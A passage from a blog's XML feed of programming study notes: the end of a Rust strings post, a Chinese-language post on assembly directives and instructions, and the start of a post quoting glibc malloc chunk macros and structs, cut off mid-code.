rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> s1 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;tic&quot;</span>);<br>    <span class="hljs-keyword">let</span> s2 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;tac&quot;</span>);<br>    <span class="hljs-keyword">let</span> s3 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;toe&quot;</span>);<br><span class="hljs-comment">//format! macro uses references so that this call doesn’t take ownership of any of its parameters.</span><br>    <span class="hljs-keyword">let</span> s = <span class="hljs-built_in">format!</span>(<span class="hljs-string">&quot;&#123;&#125;-&#123;&#125;-&#123;&#125;&quot;</span>, s1, s2, s3);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="INDEXING"><a href="#INDEXING" class="headerlink" title="INDEXING"></a>INDEXING</h3><ul><li>try to index will lead to an error, because String is a wrapper of Vec&lt;u8&gt; </li><li>You must use range syntax like :</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> hello = <span class="hljs-string">&quot;Здравствуйте&quot;</span>;<br><span class="hljs-keyword">let</span> s = &amp;hello[<span class="hljs-number">0</span>..<span class="hljs-number">4</span>];<br></code></pre></div></td></tr></table></figure><p>​        But you can’t simply use the &amp;hello[0..1]  because index 1 is not a char boundary.</p><ul><li>Use for_in_ to iterating over strings.</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;नमस्ते&quot;</span>.chars() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, c);<br>&#125;<br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;नमस्ते&quot;</span>.bytes() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, b);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>This trade-off exposes more of the complexity of strings than is apparent in other programming languages, but it prevents you from having to handle errors involving non-ASCII characters later in your development life cycle.</li></ul><h2 id="hash-map"><a href="#hash-map" class="headerlink" title="hash map"></a>hash map</h2><h1 id="Error-Handling"><a href="#Error-Handling" class="headerlink" title="Error Handling"></a><a href="https://doc.rust-lang.org/book/ch09-00-error-handling.html#error-handling">Error Handling</a></h1><ul><li>Rust group errors into two categories: <em>recoverable and unrecoverable errors</em>. Most languages don’t distinguish these two kinds of errors, using mechanism such as exceptions. Rust don’t have exceptions. Instead, it has the type <code>Result&lt;T, E&gt;</code> for recoverable errors and the <code>panic!</code> macro that stops execution when the program encounters an unrecoverable error.</li></ul>]]></content>
    
    
    <categories>
      
      <category>programming_language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>programming_language</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Assembly Language</title>
    <link href="/2021-08/pwn-Assembly/"/>
    <url>/2021-08/pwn-Assembly/</url>
    
    <content type="html"><![CDATA[<h1 id="汇编语言伪指令-最要命的"><a href="#汇编语言伪指令-最要命的" class="headerlink" title="汇编语言伪指令(最要命的"></a>汇编语言伪指令(最要命的</h1><blockquote><ul><li>伪指令 (directive) 是嵌入源代码中的命令，由汇编器识别和执行。伪指令不在运行时执行，但是它们可以定义变量、宏和子程序；为内存段分配名称，执行许多其他与汇编器相关的日常任务。</li><li>简单来说就是方便编程的指令 </li></ul></blockquote><h2 id="基本"><a href="#基本" class="headerlink" title="基本:"></a>基本:</h2><ul><li><code>.data     .code     .stack</code> 定义段(segment)</li><li><code>.model flat,stdcall</code>它告诉汇编程序用的是哪一种存储模式</li><li><code>.END</code>标记一个程序的结束</li></ul><h2 id="数据类型及伪指令"><a href="#数据类型及伪指令" class="headerlink" title="数据类型及伪指令"></a>数据类型及伪指令</h2><h3 id="数据定义"><a href="#数据定义" class="headerlink" title="数据定义"></a>数据定义</h3><table><thead><tr><th>类型</th><th>用法</th></tr></thead><tbody><tr><td>BYTE</td><td>8 位无符号整数，B 代表字节</td></tr><tr><td>SBYTE</td><td>8 位有符号整数，S 代表有符号</td></tr><tr><td>WORD</td><td>16 位无符号整数</td></tr><tr><td>SWORD</td><td>16 位有符号整数</td></tr><tr><td>DWORD</td><td>32 位无符号整数，D 代表双（字）</td></tr><tr><td>SDWORD</td><td>32 位有符号整数，SD 代表有符号双（字）</td></tr><tr><td>FWORD</td><td>48 位整数（保护模式中的远指针）</td></tr><tr><td>QWORD</td><td>64 位整数，Q 代表四（字）</td></tr><tr><td>TBYTE</td><td>80 位（10 字节）整数，T 代表 10 字节</td></tr><tr><td>REAL4</td><td>32 位（4 字节）IEEE 短实数</td></tr><tr><td>REAL8</td><td>64 位（8 字节）IEEE 长实数</td></tr><tr><td>REAL10</td><td>80 位（10 字节）IEEE 扩展实数</td></tr></tbody></table><p>还可以是传统数据定义伪指令，如下表所示。</p><table><thead><tr><th>伪指令</th><th>用法</th><th>伪指令</th><th>用法</th></tr></thead><tbody><tr><td>DB</td><td>8位整数</td><td>DQ</td><td>64 位整数或实数</td></tr><tr><td>DW</td><td>16 位整数</td><td>DT</td><td>定义 80 位（10 字节）整数</td></tr><tr><td>DD</td><td>32 位整数或实数</td><td></td><td></td></tr></tbody></table><p>初始化语句</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">[name] directive initializer [,initializer]...<br></code></pre></div></td></tr></table></figure><p>如果希望不对变量进行初始化（随机分配数值），可以用符号 ? 作为初始值, 所有数值都由汇编器来转成二进制数据</p><ul><li><p>BYTE and SBYTE</p><ul><li>多初始值定义数组</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">list BYTE 10,20,30,40<br>#甚至可以:<br>list BYTE 10,20,30,40<br>     BYTE 50,60,70,80<br>     BYTE 81,82,83,84<br></code></pre></div></td></tr></table></figure><ul><li> 定义字符串: 使用BYTE, </li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">greeting1 BYTE &quot;Good afternoon&quot;,0<br>#也可以<br>greeting1 BYTE &quot;Welcome to the Encryption Demo program &quot;<br>          BYTE &quot;created by Kip Irvine.&quot;,0dh, 0ah<br>#还可以使用backslash分行<br></code></pre></div></td></tr></table></figure><ul><li>DUP 操作符: 使用一个整数表达式作为计数器，为多个数据项分配存储空间</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm"> BYTE 4 DUP ( &quot;STACK&quot; ) ; 20 个字节：<br>#第一个数字是BYTE的个数, 第二个数字由DUP计算得出, 单位是字节    <br>#提供了一种方便的方式来初始化数组:<br>array BYTE 5 DUP (?) ; 5 个数值，未初始化<br></code></pre></div></td></tr></table></figure></li><li><p>WORD and SWORD, DWORD, SDWORD, QWORD, </p><ul><li>同BYTE和SBYTE</li></ul></li><li><p>剩下还有浮点类型, BCD数据等等, 不看了</p></li></ul><hr><ul><li><p><code>.DATA ?</code>伪指令声明未初始化数据。当定义大量未初始化数据时，.DATA ? 伪指令减少了编译程序的大小。</p></li><li><p>等号=伪指令, 相当于宏定义一个数据, 可多次重复定义</p></li><li><p>当前地址计数器:<strong><code>selfPtr DWORD $</code></strong> </p></li><li><p>让汇编器计算数组长度: </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">list BYTE 10,20,30,40<br>ListSize = ($ - list) # 注意此时计算出来的是地址的差值, 所以单位是字节, 如果遇到WORD要注<br></code></pre></div></td></tr></table></figure></li><li><p>EQU伪指令, 无法多次定义</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">name EQU expression#必须是整数表达式<br>name EQU symbol#任意一个用EQU或=定义过的符号<br>name EQU &lt;text&gt;#直接文本替换, 最像#define, 也可用来定义实数<br></code></pre></div></td></tr></table></figure></li><li><p>TEXTEQU 文本宏伪指令, </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">name TEXTEQU &lt;text&gt;# 就是文本<br>name TEXTEQU textmacro# 前面的文本宏<br>name TEXTEQU %constExpr# 整数表达式<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h3><p>操作数有 3 种基本类型：</p><ul><li>立即数——用数字文本表达式</li><li>寄存器操作数——使用 CPU 内已命名的寄存器</li><li>内存操作数——引用内存位置</li></ul><table><thead><tr><th>操作数</th><th>说明</th></tr></thead><tbody><tr><td>reg8</td><td>8 位通用寄存器：AH、AL、BH、BL、CH、CL、DH、DL</td></tr><tr><td>reg16</td><td>16 位通用寄存器：AX、BX、CX、DX、SI、DI、SP、BP</td></tr><tr><td>reg32</td><td>32 位通用寄存器：EAX、EEX、ECX、EDX、ESI、EDI、ESP、EBP</td></tr><tr><td>reg</td><td>通用寄存器</td></tr><tr><td>sreg</td><td>16 位段寄存器：CS、DS、SS、ES、FS、GS</td></tr><tr><td>imm</td><td>8 位、16 位或 32 位立即数</td></tr><tr><td>imm8</td><td>8 位立即数，字节型数值</td></tr><tr><td>imm16</td><td>16 位立即数，字类型数值</td></tr><tr><td>imm32</td><td>32 位立即数，双字型数值</td></tr><tr><td>reg/mem8</td><td>8 位操作数，可以是 8 位通用寄存器或内存字节</td></tr><tr><td>reg/mem16</td><td>16 位立即数，可以是 16 位通用寄存器或内存字</td></tr><tr><td>reg/mem32</td><td>32 位立即数，可以是 32 位通用寄存器或内存双字</td></tr><tr><td>mem</td><td>8位、16 位或 32 位内存操作数</td></tr></tbody></table><hr><p>4.9 <a href="http://c.biancheng.net/view/3514.html">OFFSET运算符</a> : 表示的是该数据标号距离数据段起始地址的距离</p><p>4.10 <a href="http://c.biancheng.net/view/3515.html">ALIGN伪指令</a> 1,2,4,8,16字节对齐</p><p>4.11 <a href="http://c.biancheng.net/view/3516.html">PTR运算符</a> </p><ul><li><p><code>mov ax,WORD PTR myDouble</code>, 把一个DWORD的低两字节传入ax(因为是小端法存储, 而且可用偏移来传入<br>高两字节:<code>mov ax,WORD PTR [myDouble+2]</code>)</p></li><li><p>把两个小的移入大的: </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">wordList WORD 5678h,1234h<br>mov eax, DWORD PTR wordList<br></code></pre></div></td></tr></table></figure></li></ul><p>4.12 <a href="http://c.biancheng.net/view/3517.html">TYPE运算符</a> 返回变量的大小</p><p>4.13 <a href="http://c.biancheng.net/view/3518.html">LENGTHOF运算符 </a> 计算数组中元素的个数, 如果数组占据多行, 只计算第一行</p><p>4.14 <a href="http://c.biancheng.net/view/3519.html">LABEL伪指令</a> 可以插入一个标号，并定义它的大小属性，但是不为这个标号分配存储空间<br>        <code>LongValue LABEL DWORD</code> 标识下一个地址开始的DWORD字节</p><p>4.15 <a href="http://c.biancheng.net/view/3525.html">间接寻址</a> 特殊: <code>inc BYTE PTR [esi]</code> 要加指针的类型, 剩下的有很多, 详见网站</p><p>4.16 <a href="http://c.biancheng.net/view/3528.html">JMP和LOOP指令</a> 这个loop集成了ECX以及其他一些指令, 要看的话详见网站</p><h2 id="汇编语言过程"><a href="#汇编语言过程" class="headerlink" title="汇编语言过程"></a>汇编语言过程</h2><ul><li><p>压栈出栈, push&amp;pop</p></li><li><p>PUSHFD 和 POPFD 指令: 压入和弹出EFLAGS寄存器</p></li><li><p>PUSHA (push all-16bits), PUSHAD (push all double-32bits),  POPAD 和 POPA</p></li><li><p><strong>PROC和ENDP ：定义一个过程</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">main PROC<br>.<br>.<br>main ENDP<br></code></pre></div></td></tr></table></figure><ul><li>标号只有过程中的有效, 不过也可以定义全局标号<code>Destination::</code>, 使用两个引号即可, 尽量少用</li></ul></li><li><p>USES 运算符: 在PROC 伪指令一行后面指出当前过程要修改的寄存器, 汇编器在头尾自动生成push和pop指令, 只对汇编器有效</p></li><li><p>链接库跳过</p></li></ul><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><table><thead><tr><th>操作</th><th>说明</th></tr></thead><tbody><tr><td>AND</td><td>源操作数和目的操作数进行逻辑与操作</td></tr><tr><td>OR</td><td>源操作数和目的操作数进行逻辑或操作</td></tr><tr><td>XOR</td><td>源操作数和目的操作数进行逻辑异或操作</td></tr><tr><td>NOT</td><td>对目标操作数进行逻辑非操作</td></tr><tr><td>TEST</td><td>源操作数和目的操作数进行逻辑与操作，并适当地设置 CPU 标志位</td></tr></tbody></table><ul><li>置位和清除零标志位、符号标志位、进位标志位和溢出标志位的<a href="http://c.biancheng.net/view/3563.html">方法</a> </li><li>汇编语言64位模式下的布尔指令: <ul><li>32 位操作数是一个特殊的情况，需要与其他大小操作数的情况分开考虑。</li></ul></li><li>条件跳转<ul><li>注意无符号数和有符号数的比较是不同的.</li><li></li></ul></li><li>…</li></ul><h2 id="整数运算"><a href="#整数运算" class="headerlink" title="整数运算"></a>整数运算</h2><ol><li><p><a href="http://c.biancheng.net/view/3589.html">汇编语言移位和循环移位指令简介</a> </p></li><li><p><a href="http://c.biancheng.net/view/3590.html">汇编语言SHL（左移）指令：将操作数逻辑左移一位</a> </p></li><li><p><a href="http://c.biancheng.net/view/3591.html">汇编语言SHR（右移）指令：将操作数逻辑右移一位</a> </p></li><li><p><a href="http://c.biancheng.net/view/3592.html">汇编语言SAL（算术左移）和SAR（算术右移）指令：将操作数左</a> </p></li><li><p><a href="http://c.biancheng.net/view/3593.html">汇编语言ROL（循环左移）指令：将操作数所有位都向左移</a> </p></li><li><p><a href="http://c.biancheng.net/view/3595.html">汇编语言ROR（循环右移）指令：将操作数所有位都向右移</a> </p></li><li><p><a href="http://c.biancheng.net/view/3596.html">汇编语言RCL（带进位循环左移）和RCR（带进位循环右移）指令</a> </p></li><li><p><a href="http://c.biancheng.net/view/3597.html">汇编语言SHLD（双精度左移）和SHRD（双精度右移）指令</a> </p></li><li><p><a href="http://c.biancheng.net/view/3600.html">汇编语言移位和循环移位的应用</a> </p></li><li><p><a href="http://c.biancheng.net/view/3602.html">汇编语言MUL指令：无符号数乘法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3603.html">汇编语言IMUL指令：有符号数乘法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3605.html">汇编语言GetMseconds：测量程序执行时间</a> </p></li><li><p><a href="http://c.biancheng.net/view/3606.html">汇编语言DIV指令：无符号除法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3609.html">汇编语言IDICV指令：有符号数除法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3610.html">使用汇编语言实现算术表达式[实例]</a> </p></li><li><p><a href="http://c.biancheng.net/view/3611.html">汇编语言ADC指令：带进位加法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3612.html">汇编语言SBB指令：带借位减法</a> </p></li><li><p><a href="http://c.biancheng.net/view/3614.html">汇编语言ASCII和非压缩十进制运算</a> </p></li><li><p><a href="http://c.biancheng.net/view/3615.html">汇编语言AAA指令：调整ADD或ADC指令的二进制运算结果 </a> </p></li><li><p><a href="http://c.biancheng.net/view/3616.html">汇编语言AAS指令：减法后的ASXII调整</a> </p></li><li><p><a href="http://c.biancheng.net/view/3617.html">汇编语言AAM（乘法后的ASCII调整）和AAD（除法之前的ASCII调整）指</a> </p></li><li><p><a href="http://c.biancheng.net/view/3619.html">汇编语言压缩十进制运算简介</a> </p></li><li><p><a href="http://c.biancheng.net/view/3621.html">汇编语言DAA指令：加法后的十进制调整</a> </p></li><li><p><a href="http://c.biancheng.net/view/3622.html">汇编语言DAS指令：减法后的十进制调整</a> </p></li></ol><h2 id="汇编语言高级过程"><a href="#汇编语言高级过程" class="headerlink" title="汇编语言高级过程"></a>汇编语言高级过程</h2>]]></content>
    
    
    <categories>
      
      <category>programming_language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>programming_language</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>glibc_malloc(2.27/28) &amp; techniques</title>
    <link href="/2021-08/pwn-glibc-malloc-srcCode/"/>
    <url>/2021-08/pwn-glibc-malloc-srcCode/</url>
    
    <content type="html"><![CDATA[<h1 id="基本数据结构及函数"><a href="#基本数据结构及函数" class="headerlink" title="基本数据结构及函数"></a>基本数据结构及函数</h1><h2 id="管理chunk"><a href="#管理chunk" class="headerlink" title="管理chunk"></a>管理chunk</h2><h3 id="Size-and-alignment-checks-and-conversions"><a href="#Size-and-alignment-checks-and-conversions" class="headerlink" title="Size and alignment checks and conversions"></a>Size and alignment <code>checks</code> and conversions</h3><p class="note note-info"><strong><u>MALLOC_ALIGNMENT</u></strong> 在 32 平台 chunk 地址按 8 字节对齐，64 位平台按 8 字节或是 16 字节对齐, 一般是16</p> <figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* conversion from malloc headers to user pointers, and back */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span><br><span class="hljs-comment">/* The smallest possible chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span><br><span class="hljs-comment">/* The smallest size we can malloc is an aligned minimal chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MINSIZE  \</span><br><span class="hljs-meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> misaligned_chunk(p) \</span><br><span class="hljs-meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span><br><span class="hljs-meta">   &amp; MALLOC_ALIGN_MASK)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Check if a request is so large that it would wrap around zero when</span><br><span class="hljs-comment">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="hljs-comment">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span><br><span class="hljs-meta">  ((unsigned long) (req) &gt;=                                                      \</span><br><span class="hljs-meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span><br><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> request2size(req)                                         \</span><br><span class="hljs-meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="hljs-meta">   MINSIZE :                                                      \</span><br><span class="hljs-meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="hljs-comment">/* Same, except also perform an argument and result check.  First, we check</span><br><span class="hljs-comment">   that the padding done by request2size didn&#x27;t result in an integer</span><br><span class="hljs-comment">   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting</span><br><span class="hljs-comment">   size isn&#x27;t so large that a later alignment would lead to another integer</span><br><span class="hljs-comment">   overflow.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> checked_request2size(req, sz) \</span><br><span class="hljs-meta">(&#123;                                    \</span><br><span class="hljs-meta">  (sz) = request2size (req);            \</span><br><span class="hljs-meta">  <span class="hljs-meta-keyword">if</span> (((sz) &lt; (req))                    \</span><br><span class="hljs-meta">      || REQUEST_OUT_OF_RANGE (sz)) \</span><br><span class="hljs-meta">    &#123;                                    \</span><br><span class="hljs-meta">      __set_errno (ENOMEM);            \</span><br><span class="hljs-meta">      return 0;                            \</span><br><span class="hljs-meta">    &#125;                                    \</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></div></td></tr></table></figure><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_chunk">malloc_chunk</a></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br>  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      mchunk_size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>Chunks always begin on even word boundaries, so the mem portion (which is returned to the user) is also on an even word boundary, and thus at least double-word <strong>aligned</strong>.</li></ul><h3 id="chunk-operations"><a href="#chunk-operations" class="headerlink" title="chunk operations"></a><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#1229">chunk operations</a></h3><p>没啥特别的, 如果有需要的话随时查找即可</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PREV_INUSE 0x1</span><br><span class="hljs-comment">/* extract inuse bit of previous chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span><br><span class="hljs-comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_MMAPPED 0x2</span><br><span class="hljs-comment">/* check for mmap()&#x27;ed chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span><br><span class="hljs-comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span><br><span class="hljs-comment">   from a non-main arena.  This is only set immediately before handing</span><br><span class="hljs-comment">   the chunk to the user, if necessary.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NON_MAIN_ARENA 0x4</span><br><span class="hljs-comment">/* Check for chunk from main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span><br><span class="hljs-comment">/* Mark a chunk as not being on the main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Bits to mask off when extracting size</span><br><span class="hljs-comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span><br><span class="hljs-comment">   macros for which mmapped chunks should never be seen. This should</span><br><span class="hljs-comment">   cause helpful core dumps to occur if it is tried by accident by</span><br><span class="hljs-comment">   people extending or adapting this malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span><br><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span><br><span class="hljs-comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><span class="hljs-comment">/* Set the 